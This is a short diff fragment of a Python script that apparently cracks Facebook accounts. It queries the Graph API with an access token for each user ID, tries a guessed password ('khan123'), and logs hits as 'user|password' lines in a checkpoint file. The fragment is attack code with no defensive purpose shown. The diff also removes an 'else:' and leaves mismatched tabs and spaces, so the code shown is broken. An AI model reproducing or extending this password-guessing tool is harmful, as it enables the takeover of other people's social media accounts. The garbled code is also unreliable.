@@ -404,7 +404,7 @@ def pilih_super():
 																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass8)														
-               else:
+           
  	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass9 = ('khan123')
